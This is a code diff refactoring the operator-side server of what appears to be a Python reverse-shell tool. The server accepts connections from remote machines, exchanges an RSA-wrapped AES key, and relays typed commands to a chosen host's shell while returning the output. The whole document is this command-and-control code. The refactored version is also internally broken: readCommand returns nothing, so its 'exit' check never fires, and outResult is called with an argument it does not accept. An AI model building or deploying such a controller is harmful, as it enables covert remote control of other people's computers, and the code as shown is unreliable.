@@ -1,6 +1,6 @@
 from CryptoAC.Asymmetric.Rsa import RSA
 from CryptoAC.Symmetric.AcAes import AesCrypto
-from .Connection import Connection
+from .ConnectionsManager import ConnectionManager
 from .internalClient import InternalSocketClient
 from Tools.toolsF import randombyte
 import socket
@@ -17,41 +17,26 @@ class Server(object):
             socket.gethostbyname(socket.gethostname())
             ,port
         )
+        self.connections = ConnectionManager()
         self.rsa = RSA()
-        self.lock = threading.Lock()
         self.PrivateKey = PrivateKey
         self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
-        self.connection = Connection()
-        self.connectTo = None
-        self.connections = {}
-        self.istest = False
         self.testMsg = bytes([100])
         self.sleepPerPing = 2 
         self.sleepPeriter = 2
         self._internalclient = InternalSocketClient()
         
-    def __insertConnection__(self,addr):
-        self.connections[addr[0]] = {
-            'hostname':'aharon',
-            'connected':False
-        }
-
-        
-    def __rmConnections(self,ip):
-        with self.lock:
-            try: self.connections.remove(ip)
-            except: pass
-    
-    
-    def setCipher(self):
-        msg = self.connection.conn.recv(self.rsaBlock)
-        print(msg)
+       
+    def setCipher(self,conn):
+        msg = conn.recv(self.rsaBlock)
         key = self.rsa.decrypt(
             self.PrivateKey,
             msg
         )
-        self.connection.aes = AesCrypto(key, None)
-        self.connection.aes.set_iv(key)
+        self.connections.addAesToconnection(
+            conn,
+            AesCrypto(key, None)
+        ) 
 
 
     def ping(self, conn, timeout=5):
@@ -66,40 +51,23 @@ class Server(object):
             pass
         return False
     
-    def __sendConnect__(self,conn,addr):
-        conn.send(
-            bytes([106, 125, 139, 23, 156, 162, 56, 40, 221, 20, 145, 82, 168, 87, 194, 241])
-        )
-        self.connectTo = None
-        self.connection.addr = addr
-        self.connection.conn = conn
-        self.connections[addr[0]]['connected']=True
-        self.__handleWhileConnected__(addr[0])
-    
     
     def onConnect(self,conn,addr):
-        self.__insertConnection__(addr)
+        self.connections.insertNewConnction(conn)
         while True:
-            print(self.connectTo)
-            if self.connectTo == addr[0]:
-                self.__sendConnect__(conn,addr)
+            if self.connections.connctTo == addr[0]:
+                self.connections.connectToTarget(conn)
+                self._setShellMode(conn)
             elif not self.ping(conn):
-                print('NotPing')
-                conn.close(), self.__rmConnections(addr[0])
+                conn.close()
+                self.connections.removeConnection(conn)
                 return
             time.sleep(self.sleepPeriter)
-
-
-    def __handleWhileConnected__(self,ip):
-        while self.connection.conn:
-            time.sleep(self.sleepPerPing)
-        self.connected.remove(ip)
-            
-                   
+                               
              
-    def sendMsg(self, msg):
-        msg = self.connection.aes.encrypt(msg)
-        self.connection.conn.send(
+    def sendMsg(self, connection,msg):
+        msg = connection.aes.encrypt(msg)
+        connection.conn.send(
             int.to_bytes(
                 len(msg),
                 length=4,
@@ -108,45 +76,39 @@ class Server(object):
         )
 
 
-    def recvMsg(self):
-        header = int.from_bytes(self.connection.conn.recv(4))
-        res = self.connection.conn.recv(header)
+    def recvMsg(self,connection):
+        header = int.from_bytes(connection.conn.recv(4))
+        res = connection.conn.recv(header)
         while len(res) < header:
-            res += self.connection.conn.recv(header-len(res))
-        return self.connection.aes.decrypt(res)
+            res += connection.conn.recv(header-len(res))
+        return connection.aes.decrypt(res)
         
         
-    def readCommand(self):
+    def readCommand(self,connection):
         command = self._internalclient._read_msg().decode(errors='replace')
-        self.sendMsg(command.encode())
+        self.sendMsg(connection,command.encode())
     
 
     def outResult(self):
         self._internalclient._send_msg(self.recvMsg())
 
-    def _setShellMode(self):
+
+    def _setShellMode(self,conn):
+        print('Satrting RevrseShell...')
+        self.setCipher(conn)
+        fixedConnection = self.connections.getFixedConnection(conn)
         while True:
-            if self.connection.conn:
-                print('Satrting RevrseShell...')
-                self.setCipher()
-                self.connection.reset()
-                while True:
-                    command = self.readCommand()
-                    if command == 'exit':
-                        self.connections[self.connection.addr]['connected']=False
-                        self.connection = Connection()
-                        break
-                    self.outResult()
-                    time.sleep(0.5)
-            time.sleep(2)
+            command = self.readCommand(fixedConnection)
+            if command == 'exit':
+                break
+            self.outResult(fixedConnection)
+            time.sleep(0.5)
         
     
-        
     def __listener__(self):
         self.server.bind(self.ServInfo)
         self.server.listen()
         print("{+}Listening...")
-        threading.Thread(target=self._setShellMode).start()
         while True:
             conn, addr = self.server.accept()
             print("Accept Connection.")
@@ -155,6 +117,7 @@ class Server(object):
                 args=(conn,addr)
             ).start()
             time.sleep(1)
+
             
     def start(self):
         threading.Thread(target=self.__listener__).start()
